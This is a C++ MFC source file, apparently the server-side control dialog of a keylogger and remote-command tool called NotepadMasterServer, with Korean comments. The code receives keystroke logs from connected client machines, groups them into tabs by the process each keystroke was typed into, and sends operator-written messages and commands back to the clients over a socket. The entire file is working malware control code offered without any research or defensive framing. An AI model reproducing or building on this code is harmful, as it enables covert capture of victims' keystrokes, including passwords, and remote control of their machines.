// CClient.cpp: 구현 파일
//

#include "pch.h"
#include "NotepadMasterServer.h"
#include "CClient.h"
#include "CClientKeylog.h"
#include "afxdialogex.h"

#include "definition.h"

// CClient 대화 상자

IMPLEMENT_DYNAMIC(CClient, CDialogEx)

CClient::CClient(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_DIALOG_CLIENT, pParent)
	, m_msg_kind(0)
	, m_command(_T(""))
{

}

CClient::~CClient()
{
}

void CClient::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Radio(pDX, IDC_RADIO_MSG_KIND1, m_msg_kind);
	DDX_Text(pDX, IDC_EDIT_COMMAND, m_command);
	DDX_Control(pDX, IDC_TAB_CLIENT_KEYLOG, m_tab_client_keylog);
}


BEGIN_MESSAGE_MAP(CClient, CDialogEx)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_BUTTON_SEND, &CClient::OnBnClickedButtonSend)
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB_CLIENT_KEYLOG, &CClient::OnSelchangeTabClientKeylog)
END_MESSAGE_MAP()


// CClient 메시지 처리기

BOOL CClient::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	if (!m_keylogs.size()) // 키로그를 하나도 전송받지 못했다면
		return TRUE;

	// TODO:  여기에 추가 초기화 작업을 추가합니다.
	for (int i = 0; i < m_keylogs.size(); i++) // 모든 프로세스의 탭 컨트롤 생성
		UpdateKeylog(i);

	m_keylogs[0]->ShowWindow(SW_SHOW);

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 예외: OCX 속성 페이지는 FALSE를 반환해야 합니다.
}

void CClient::OnClose()
{
	// TODO: 여기에 메시지 처리기 코드를 추가 및/또는 기본값을 호출합니다.
	DestroyWindow();
	CDialogEx::OnClose();
}


void CClient::OnBnClickedButtonSend()
{
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
	UpdateData(TRUE);
	m_command.Replace(L"\r\n", L"\n");

	PDUMessage pdu_message;
	PDUCommand pdu_command;
	switch (m_msg_kind)
	{
	case 0:
		wcscpy_s(pdu_message.message, m_command.GetBuffer());
		pdu_message.protocol_type = MESSAGE;
		socket->Send(&pdu_message, 1 + m_command.GetLength() * 2 + 1); // protocol_type(1byte) + command(unicode len * 2)
		break;

	case 1 :
		wcscpy_s(pdu_command.command, m_command.GetBuffer());
		pdu_command.protocol_type = COMMAND;
		socket->Send(&pdu_command, 1 + m_command.GetLength() * 2 + 1); // protocol_type(1byte) + command(unicode len * 2)
		break;
	}
}

// 클라이언트가 보낸 키로그를 받았을때(CClientSocket -> main dialog -> CClient)
void CClient::ReceiveKeylog(PDUKeylog* pdu)
{
	// TODO: 여기에 구현 코드 추가.
	UINT i;

	// 프로세스 리스트를 순환하며 일치하는 프로세스 인덱스를 찾음
	for (i = 0; i < m_keylogs.size(); i++)
	{
		if (!wcscmp(pdu->process_name, m_keylogs[i]->GetProcessName()))
			break;
	}
	if (i == m_keylogs.size()) // 처음 보는 프로세스일때
	{
		// 프로세스 리스트에 추가
		m_keylogs.push_back(new CClientKeylog(pdu->process_name));
	}
	if (pdu->state == VK_RETURN) // Line Feed 이면
		m_keylogs[i]->m_client_keylog += L"\x0a\x0d"; // CRLF로 만들어줌
	else
		m_keylogs[i]->m_client_keylog += pdu->state; // 내부에 키로그 기록

	if (!m_hWnd) // 창이 안띄워져 있을땐 업데이트x
		return;

	UpdateKeylog(i);
	
}

/* 특정 프로세스의 키로그 출력창을 업데이트 */
void CClient::UpdateKeylog(UINT index)
{
	// TODO: 여기에 구현 코드 추가.

	// 키로그 출력창 윈도우가 생성되어있지 않으면
	if (!m_keylogs[index]->m_hWnd)
	{
		m_tab_client_keylog.InsertItem(index, m_keylogs[index]->GetProcessName()); // 탭 메뉴를 만듬
		m_keylogs[index]->Create(IDD_DIALOG_CLIENT_KEYLOG, &m_tab_client_keylog); // 출력창을 탭 메뉴 안에 생성함
		
		// 탭 위치, 크기, 보이기 등 설정
		CRect size;
		m_tab_client_keylog.GetWindowRect(&size);
		m_keylogs[index]->MoveWindow(0, 20, size.Width(), size.Height());
		m_keylogs[index]->ShowWindow(SW_HIDE);

		m_keylogs[m_tab_client_keylog.GetCurSel()]->ShowWindow(SW_HIDE);
		m_keylogs[m_tab_client_keylog.GetCurSel()]->ShowWindow(SW_SHOW);
	}
	m_keylogs[index]->UpdateData(FALSE); // 데이터 출력까지
}


void CClient::OnSelchangeTabClientKeylog(NMHDR *pNMHDR, LRESULT *pResult)
{
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
	for (int i = 0; i < m_tab_client_keylog.GetItemCount(); i++)
		m_keylogs[i]->ShowWindow(SW_HIDE);

	m_keylogs[m_tab_client_keylog.GetCurSel()]->ShowWindow(SW_SHOW);

	*pResult = 0;
}
